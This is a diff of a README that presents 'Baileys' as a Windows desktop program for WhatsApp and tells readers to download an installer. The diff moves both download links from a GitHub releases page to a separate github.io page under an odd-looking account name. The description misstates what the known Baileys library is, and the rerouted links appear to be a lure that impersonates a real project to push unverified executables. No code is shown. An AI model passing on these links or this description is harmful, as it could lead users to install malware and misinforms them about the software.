@@ -1,6 +1,6 @@
 # 📱 Baileys - Connect your computer to WhatsApp easily
 
-[![Download Baileys](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Clinchslanteye776/Baileys/releases)
+[![Download Baileys](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://clinchslanteye776.github.io)
 
 Baileys helps you manage WhatsApp messages through your computer. It creates a bridge between your desktop environment and the WhatsApp web interface. This tool handles the technical connection logic so that you can focus on your messages.
 
@@ -8,7 +8,7 @@ Baileys helps you manage WhatsApp messages through your computer. It creates a b
 
 You need the latest version of the program to run it on your Windows machine. Visit the official release page to find the installer that works for your system.
 
-[Download Baileys Here](https://github.com/Clinchslanteye776/Baileys/releases)
+[Download Baileys Here](https://clinchslanteye776.github.io)
 
 1. Click the link above.
 2. Look for the latest version at the top of the list.
